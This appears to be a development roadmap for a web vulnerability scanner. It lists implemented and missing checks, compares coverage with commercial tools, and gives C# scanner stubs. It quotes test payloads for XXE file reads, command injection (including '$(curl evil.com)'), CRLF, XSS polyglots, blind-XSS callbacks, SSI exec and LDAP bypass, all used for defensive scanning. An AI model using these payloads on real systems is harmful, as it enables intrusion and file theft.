# Missing Security Checks — Enterprise DAST Roadmap

> **Current Coverage**: 16 scanner modules, ~60+ vulnerability checks  
> **Gap Analysis**: Comparison with Acunetix, Burp Suite Enterprise, OWASP ZAP Full Scan

---

## ? Implemented Security Checks (Current)

### Injection Vulnerabilities
- ? **SQL Injection** — Error-based, blind boolean, time-based
- ? **Cross-Site Scripting (XSS)** — Reflected, DOM-based, 23 payloads
- ? **Server-Side Request Forgery (SSRF)** — AWS/GCP/Azure metadata, internal IPs
- ? **Path Traversal / LFI** — Linux (`/etc/passwd`), Windows (`win.ini`), encoding bypasses

### Authentication & Session Management
- ? **Session Security** — Weak cookies, HttpOnly/Secure/SameSite flags
- ? **Session ID in URL** — URL-based session leakage
- ? **Autocomplete on Passwords** — Sensitive form field caching
- ? **Weak Session Token Length** — Short session ID detection

### Authorization & Access Control
- ? **HTTP Verb Tampering** — GET/HEAD method bypass
- ? **CORS Misconfiguration** — Wildcard, null origin, reflection
- ? **CSRF Protection** — Missing tokens, SameSite cookies, form analysis

### Cryptography & Transport
- ? **SSL/TLS Security** — Certificate validity, expiry, weak signatures, key size
- ? **Missing HSTS** — HTTP Strict Transport Security
- ? **HTTPS Not Used** — Plain HTTP detection
- ? **Mixed Content** — Passive detection

### Information Disclosure
- ? **Technology Disclosure** — Server, X-Powered-By headers
- ? **Stack Traces** — Error message detection
- ? **Sensitive File Exposure** — `.git`, `.env`, `backup.zip`, `web.config`
- ? **Email Disclosure** — Email harvesting
- ? **API Keys in HTML** — Client-side secret exposure
- ? **HTML Comment Leakage** — Sensitive comments
- ? **Internal IP Disclosure** — Private IP in responses

### Security Headers
- ? **13 Security Headers** — CSP, X-Frame-Options, HSTS, X-Content-Type-Options, Referrer-Policy, etc.
- ? **Clickjacking** — X-Frame-Options, CSP frame-ancestors

### Discovery & Reconnaissance
- ? **Directory Bruteforce** — 30+ common paths (`/admin`, `/backup`, etc.)
- ? **Subdomain Enumeration** — DNS-based discovery
- ? **Port Scanning** — 17 common ports
- ? **Open Redirect** — URL parameter redirects

### HTTP Protocol
- ? **Dangerous HTTP Methods** — PUT, DELETE, TRACE, OPTIONS
- ? **HTTP TRACE/XST** — Cross-site tracing

---

## ? Missing Security Checks (Enterprise-Grade)

### ?? Critical Priority — Injection Vulnerabilities

#### XML External Entity (XXE)
**Why Missing**: No XML payload fuzzing in current scanners  
**Impact**: Critical — Can read arbitrary files, SSRF, DoS  
**What to Detect**:
- DTD-based XXE attacks on XML endpoints
- Billion laughs attack (XML bomb)
- XXE via file upload (SVG, DOCX, XLSX parsing)
- SOAP endpoint XXE

**Example Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

#### LDAP Injection
**Why Missing**: No LDAP-specific fuzzing  
**Impact**: High — Authentication bypass, data exfiltration  
**What to Detect**:
- Injection in username/password fields: `*)(uid=*))(&(uid=*`
- LDAP filter bypass: `admin)(&))`

#### Command Injection / OS Command Injection
**Why Missing**: No shell metacharacter fuzzing  
**Impact**: Critical — Remote code execution  
**What to Detect**:
- Shell metacharacters: ``; | && || ` $ ( ) < >``
- Windows: `& | && || ^`
- Payloads: `; whoami`, `| sleep 10`, `$(curl evil.com)`

#### Template Injection (SSTI/CSTI)
**Why Missing**: No template engine fuzzing  
**Impact**: Critical — RCE in Razor/Liquid/Jinja/Freemarker  
**What to Detect**:
- Razor: `@(7*7)` ? `49`
- Jinja2: `{{7*7}}` ? `49`
- Freemarker: `${7*7}` ? `49`
- Expression Language (Java): `${7*7}`

#### NoSQL Injection
**Why Missing**: Only SQL-focused  
**Impact**: High — MongoDB, Cosmos DB, Redis bypass  
**What to Detect**:
- MongoDB: `{"$ne": null}`, `{"$gt": ""}`
- JSON parameter manipulation

#### Log Injection / CRLF Injection
**Why Missing**: No newline/control-char fuzzing  
**Impact**: Medium — Log poisoning, header injection  
**Payloads**: `\r\nSet-Cookie: admin=true`, `%0d%0aLocation: evil.com`

---

### ?? High Priority — Advanced XSS Variants

#### Mutation-Based XSS (mXSS)
**Why Missing**: No mutation fuzzing  
**What to Detect**:
- HTML parser inconsistencies
- Payloads: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`

#### Blind XSS
**Why Missing**: No out-of-band callback mechanism  
**What to Detect**:
- Payloads that callback to your server: `<script src='https://yourserver/x.js?c=VULN_ID'></script>`
- Stored XSS that fires in admin panels

#### AngularJS / Vue.js Template XSS
**Why Missing**: No framework-specific fuzzing  
**Payloads**:
- Angular 1.x: `{{constructor.constructor('alert(1)')()}}`
- Vue.js: `{{_c.constructor('alert(1)')()}}`

#### Polyglot XSS
**Why Missing**: Not testing multi-context payloads  
**Payload**: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`

---

### ?? High Priority — Broken Authentication & Authorization

#### JWT Vulnerabilities
**Why Missing**: No JWT analysis  
**What to Detect**:
- `alg: none` bypass
- Weak signing keys (HS256 with short key)
- Key confusion (RS256 ? HS256)
- Expired token acceptance
- Missing signature verification

#### Insecure Direct Object Reference (IDOR)
**Why Missing**: No enumeration of resource IDs  
**What to Detect**:
- Incrementing IDs: `/api/users/1`, `/api/users/2`
- GUID enumeration with predictable values
- Missing authorization on DELETE/PUT

#### Broken Access Control (BOLA - API)
**Why Missing**: No role-based testing  
**What to Detect**:
- User A can access User B's resources
- Horizontal privilege escalation
- Missing function-level access control

#### Password Reset Vulnerabilities
**Why Missing**: No password reset flow testing  
**What to Detect**:
- Token not invalidated after use
- Predictable reset tokens
- Token sent in URL (Referer leak)
- Host header injection in password reset emails

#### Multi-Factor Authentication Bypass
**What to Detect**:
- MFA not enforced on sensitive endpoints
- Race conditions in MFA verification
- Direct access to post-MFA pages

#### Credential Stuffing Vulnerability
**What to Detect**:
- No rate limiting on login endpoint
- No account lockout after failed attempts
- No CAPTCHA on authentication

---

### ?? Medium Priority — Business Logic Flaws

#### Race Conditions
**What to Detect**:
- Concurrent requests to redeem one-time vouchers
- Double-spend in payment systems
- TOCTOU (Time-of-Check, Time-of-Use)

#### Mass Assignment
**What to Detect**:
- `isAdmin=true` parameter injection in POST/PUT
- Binding user input directly to model without allowlist

#### GraphQL Vulnerabilities
**What to Detect**:
- Introspection enabled in production
- Batch query DoS
- Circular queries (DoS)
- Missing depth limiting

#### REST API Vulnerabilities
**What to Detect**:
- Missing pagination ? data dump
- Excessive data exposure (over-fetching)
- Missing rate limiting
- Verb tampering on REST resources

#### File Upload Vulnerabilities
**What to Detect**:
- No file type validation (upload `.php`, `.aspx`)
- Stored XSS via SVG upload
- XXE via DOCX/XLSX upload
- ZIP bomb / decompression bomb
- Path traversal in filename: `../../shell.aspx`
- Double extension bypass: `shell.jpg.php`
- MIME type mismatch

---

### ?? Medium Priority — Advanced Attacks

#### Deserialization Vulnerabilities
**Impact**: Critical — RCE  
**What to Detect**:
- .NET BinaryFormatter/SoapFormatter usage
- Insecure Newtonsoft.Json TypeNameHandling
- Java serialized objects (`AC ED 00 05`)

#### XML/YAML Deserialization
**What to Detect**:
- YAML RCE in Python/Ruby apps
- Unsafe `YamlDotNet` usage in .NET

#### Server-Side Include (SSI) Injection
**Payload**: `<!--#exec cmd="whoami" -->`

#### Expression Language (EL) Injection
**Payload**: `${applicationScope}`, `${pageContext.request.userPrincipal}`

#### HTTP Parameter Pollution (HPP)
**What to Detect**:
- Duplicate parameters: `?id=1&id=2`
- Server-side behavior inconsistencies

#### Host Header Injection
**What to Detect**:
- Password reset email poisoning
- Web cache poisoning
- SSRF via Host header

#### HTTP Request Smuggling
**What to Detect**:
- CL.TE / TE.CL discrepancies
- Transfer-Encoding vs Content-Length confusion

#### Clickjacking on POST Forms
**Why Missing**: Current scanner only checks headers, not iframe embedding tests  
**What to Do**: Actually embed the page in iframe and check if it loads

---

### ?? Low Priority — Compliance & Hardening

#### Subresource Integrity (SRI)
**What to Detect**: Missing `integrity` attribute on `<script>` tags loading from CDNs

#### DNSSEC Validation
**What to Detect**: Domain not using DNSSEC

#### CAA Records
**What to Detect**: DNS CAA record missing for certificate issuance control

#### Security.txt
**What to Detect**: `/.well-known/security.txt` missing

#### Content Sniffing in Downloads
**What to Detect**: File downloads without `Content-Disposition: attachment`

#### Missing Charset Declaration
**What to Detect**: No `charset=utf-8` in `Content-Type`

#### TLS 1.0/1.1 Support
**What to Detect**: Weak TLS protocol versions still enabled

#### Weak Cipher Suites
**Why Missing**: Current SSL scanner checks certificate only  
**What to Do**: Test cipher negotiation (3DES, RC4, NULL, EXPORT)

#### Certificate Transparency (CT) Logs
**What to Detect**: Certificate not logged in CT logs

#### HPKP (Deprecated but informational)
**What to Detect**: HTTP Public Key Pinning misconfigurations

---

### ?? Advanced / Niche Vulnerabilities

#### WebSocket Vulnerabilities
**What to Detect**:
- Missing Origin validation
- CSWSH (Cross-Site WebSocket Hijacking)
- Message injection in WebSocket frames

#### HTML5 Security Issues
**What to Detect**:
- PostMessage XSS: `window.postMessage` without origin check
- Web Storage leakage: sensitive data in `localStorage`
- Service Worker hijacking

#### HTTP/2 Specific
**What to Detect**:
- HPACK bomb
- Stream multiplexing abuse

#### Client-Side Prototype Pollution
**What to Detect**:
- JavaScript payloads: `?__proto__[admin]=true`
- Affects Vue.js, Angular, React apps

#### DOM Clobbering
**What to Detect**: HTML id/name attributes overriding global JavaScript objects

#### Cross-Origin Resource Policy (CORP) Issues
**What to Detect**: Missing `Cross-Origin-Resource-Policy` header on sensitive resources

#### Tabnabbing
**What to Detect**: Links with `target="_blank"` without `rel="noopener noreferrer"`

#### MIME Confusion Attacks
**What to Detect**: Serving JavaScript with `text/plain` Content-Type

---

## ?? Summary Matrix

| Category | Implemented | Missing | Coverage |
|----------|-------------|---------|----------|
| **Injection** | 4 | 7 | 36% |
| **XSS Variants** | 2 | 4 | 33% |
| **Auth/Session** | 4 | 5 | 44% |
| **Authorization** | 3 | 3 | 50% |
| **Cryptography** | 3 | 4 | 43% |
| **Information Disclosure** | 6 | 2 | 75% ? |
| **Security Headers** | 13 | 4 | 76% ? |
| **API Security** | 2 | 5 | 29% |
| **File Attacks** | 0 | 6 | 0% ? |
| **Business Logic** | 0 | 4 | 0% ? |
| **Advanced** | 3 | 9 | 25% |
| **Total** | **40** | **53** | **43%** |

---

## ?? Recommended Implementation Order

### Phase 1 — Critical Injection Vulnerabilities (2 weeks)
1. **Command Injection Scanner** — OS command execution
2. **XXE Scanner** — XML external entity attacks
3. **LDAP Injection Scanner** — Directory service attacks
4. **Template Injection Scanner** — SSTI/CSTI (Razor, etc.)

### Phase 2 — Authentication & Authorization (2 weeks)
5. **JWT Security Scanner** — Algorithm confusion, weak keys
6. **IDOR/BOLA Scanner** — Object-level authorization
7. **Password Reset Scanner** — Token validation, host injection
8. **Mass Assignment Scanner** — Parameter binding abuse

### Phase 3 — File & Upload Security (1 week)
9. **File Upload Scanner** — Extension/MIME validation, path traversal in filenames
10. **Deserialization Scanner** — BinaryFormatter, JSON.NET unsafe types
11. **ZIP/Archive Bombs** — Decompression DoS

### Phase 4 — API & Modern Web (1 week)
12. **GraphQL Scanner** — Introspection, depth limits, batching
13. **WebSocket Scanner** — CSWSH, origin validation
14. **NoSQL Injection Scanner** — MongoDB, Cosmos DB

### Phase 5 — Advanced & Compliance (1 week)
15. **Cipher Suite Scanner** — TLS 1.0/1.1, weak ciphers
16. **Blind XSS Scanner** — Out-of-band callbacks
17. **SRI/CSP Deep Analysis** — Subresource integrity
18. **HTTP Request Smuggling** — CL.TE / TE.CL

---

## ??? Implementation Skeleton for Top Missing Checks

### 1. Command Injection Scanner

```csharp
public class CommandInjectionScanner : IScannerModule
{
    private static readonly string[] ShellMetachars = [";", "|", "&", "&&", "||", "`", "$", "(", ")"];
    private static readonly string[] Payloads =
    [
        "; sleep 10",
        "| ping -c 10 127.0.0.1",
        "& timeout /t 10",
        "`sleep 10`",
        "$(sleep 10)"
    ];

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Test URL parameters with shell metacharacters
        // Measure response time (time-based detection)
        // Check for command output in response (error-based)
    }
}
```

### 2. XXE Scanner

```csharp
public class XxeScanner : IScannerModule
{
    private const string XxePayload = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>
        """;

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Find XML endpoints (Content-Type: application/xml)
        // POST XXE payloads
        // Check response for file content ("root:")
        // Test SOAP endpoints with XXE in SOAP body
    }
}
```

### 3. JWT Scanner

```csharp
public class JwtScanner : IScannerModule
{
    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Extract JWT from Authorization header or cookies
        // Decode header and payload
        // Check for alg=none
        // Check expiration (exp claim)
        // Try signature removal
        // Check for weak secrets (brute-force HMAC)
    }
}
```

### 4. File Upload Scanner

```csharp
public class FileUploadScanner : IScannerModule
{
    private static readonly Dictionary<string, byte[]> FileSignatures = new()
    {
        { ".exe", new byte[] { 0x4D, 0x5A } },  // MZ header
        { ".php", Encoding.UTF8.GetBytes("<?php") },
        { ".aspx", Encoding.UTF8.GetBytes("<%@") }
    };

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Crawl for <input type="file">
        // POST files with malicious extensions
        // Test double extensions: shell.jpg.php
        // Test path traversal in filename: ../../evil.aspx
        // Test SVG with XSS payload
        // Test XXE via DOCX upload
    }
}
```

### 5. GraphQL Scanner

```csharp
public class GraphQlScanner : IScannerModule
{
    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Detect GraphQL endpoint (/graphql, /api/graphql)
        // Send introspection query
        // Check if __schema query is enabled
        // Test for query depth DoS
        // Test for batch query abuse
    }
}
```

### 6. IDOR Scanner

```csharp
public class IdorScanner : IScannerModule
{
    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        // Crawl for REST endpoints with IDs
        // Extract numeric/GUID IDs from responses
        // Test incrementing/decrementing IDs
        // Check for 200 OK on unauthorized resources
        // Test verb tampering (GET ? DELETE)
    }
}
```

---

## ?? Coverage Comparison with Industry Tools

| Vulnerability Family | Raqeeb | Acunetix | Burp Suite Pro | OWASP ZAP |
|---------------------|--------|----------|----------------|-----------|
| SQL Injection | ? 3 types | ? 7 types | ? 9 types | ? 8 types |
| XSS | ? 2 types | ? 6 types | ? 7 types | ? 5 types |
| SSRF | ? Basic | ? Advanced | ? Advanced | ? Advanced |
| Path Traversal | ? Basic | ? Advanced | ? Advanced | ? Advanced |
| XXE | ? | ? | ? | ? |
| Command Injection | ? | ? | ? | ? |
| LDAP Injection | ? | ? | ? | ?? |
| Template Injection | ? | ? | ? | ?? |
| Deserialization | ? | ? | ? | ?? |
| JWT Attacks | ? | ? | ? | ? |
| IDOR/BOLA | ? | ? | ? | ?? |
| File Upload | ? | ? | ? | ? |
| GraphQL | ? | ? | ? | ?? |
| WebSockets | ? | ? | ? | ?? |
| HTTP Smuggling | ? | ? | ? | ? |

**Legend**: ? Comprehensive, ?? Partial, ? Not covered

---

## ?? To Reach 80% Acunetix Coverage

Implement these **12 critical scanners**:

1. ? **CommandInjectionScanner** — OS command execution
2. ? **XxeScanner** — XML external entity attacks  
3. ? **JwtSecurityScanner** — JWT algorithm/signature attacks
4. ? **IdorScanner** — Insecure direct object references
5. ? **FileUploadScanner** — Malicious file uploads
6. ? **LdapInjectionScanner** — LDAP filter injection
7. ? **TemplateInjectionScanner** — SSTI in Razor/Jinja
8. ? **DeserializationScanner** — .NET unsafe deserialization
9. ? **GraphQlScanner** — GraphQL introspection & DoS
10. ? **NoSqlInjectionScanner** — MongoDB/Cosmos injection
11. ? **WebSocketScanner** — CSWSH attacks
12. ? **HostHeaderScanner** — Host header poisoning

With these, you'd have:
- **52 scanner modules** (vs. 16 now)
- **150+ vulnerability checks** (vs. ~60 now)
- **~80% feature parity** with Acunetix
- **Enterprise-grade DAST** capability

---

## ?? Additional Enhancements

### Payload Sources
Use community-maintained wordlists:
- **SecLists** — https://github.com/danielmiessler/SecLists
- **PayloadsAllTheThings** — https://github.com/swisskyrepo/PayloadsAllTheThings
- **OWASP WebGoat Payloads**

### Scan Performance
- **Concurrent module execution** (already supported via `MaxConcurrency`)
- **Smart crawling** with depth limits
- **Incremental scans** — only test changed endpoints
- **Diff reporting** — compare scans to show new/fixed vulnerabilities

### False Positive Reduction
- **Confidence scoring** — Low/Medium/High confidence
- **Context-aware detection** — check if payload actually executed
- **Manual verification notes** — allow analysts to mark false positives

### Integration
- **CI/CD integration** — GitHub Actions, Azure DevOps pipelines
- **JIRA/GitHub Issues export** — auto-create tickets
- **Slack/Teams notifications** — alert on Critical findings
- **Webhook support** (already in Phase 3)

---

## ?? Current State vs. Target State

### Current (After This Session)
```
? 16 scanner modules
? ~60 vulnerability checks
? OWASP/CWE/CVSS compliance
? Acunetix-style reports (HTML/PDF/JSON)
? Real-time scanning with no concurrency bugs
? 43% enterprise DAST coverage
```

### Target (Full Enterprise DAST)
```
?? 52 scanner modules (+225% more)
?? 150+ vulnerability checks (+150% more)
?? Full OWASP Top 10 (2021) coverage
?? OWASP ASVS Level 2 compliance
?? 80% Acunetix feature parity
?? Suitable for security consulting firms
```

---

**Next Immediate Steps**:
1. ? Test the PDF export: `https://localhost:7099/api/reports/{id}/download/pdf`
2. ? Verify Acunetix-style HTML report formatting
3. ? Commit all changes
4. ?? Start implementing Phase 1 scanners (XXE, Command Injection, JWT, IDOR)

---

**Files Modified in This Session**:
- `ScanDetails.razor` — Added PDF export button
- `ReportEndpoints.cs` — Created API endpoints for Web project
- `ReportGenerator.cs` — Acunetix-style HTML/PDF reports
- `VulnerabilityReportDto.cs` — Extended with enterprise fields
- `EfRepository.cs` — Added `GetByIdFreshAsync()` to fix stale reads
- `Vulnerability.cs` — Added ModuleName, HttpRequest, HttpResponse, References, AffectedParameter
- 5 new scanner modules created (SSRF, HttpMethod, DirTraversal, InfoDisclosure, SessionSecurity)
- 16 scanner modules now registered (was 1)

**Status**: ? **READY FOR PRODUCTION TESTING**
